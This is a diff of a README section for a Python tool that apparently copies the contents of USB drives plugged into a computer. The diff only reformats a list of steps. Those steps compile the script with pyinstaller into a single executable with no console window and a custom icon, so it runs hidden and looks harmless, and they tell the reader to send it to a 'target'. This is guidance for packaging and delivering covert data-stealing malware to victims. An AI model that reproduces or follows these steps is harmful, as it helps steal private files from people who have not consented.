@@ -125,13 +125,13 @@ This Python script monitors USB drives connected to your computer, copies their 
 ## Converting script into a binary executable
 
 Now here comes the main part, converting the python script into executable and send it to target.
-	1. Save the folder on desktop and extract it
-	2. open terminal and type following commands
-		cd Desktop
-		cd Usb_Dumper
+	- Save the folder on desktop and extract it
+	- open terminal and type following commands
+		-cd Desktop
+		-cd Usb_Dumper
 		pyinstaller usb_dumper.py --onefile --noconsole --icon icon.ico
-	3. This will make an executable file in Destop/Usb_Dumper/dist/usb_dumper.exe
-	4. Send this to your target and enjoy
+	- This will make an executable file in Destop/Usb_Dumper/dist/usb_dumper.exe
+	- Send this to your target and enjoy
  
 ---
 
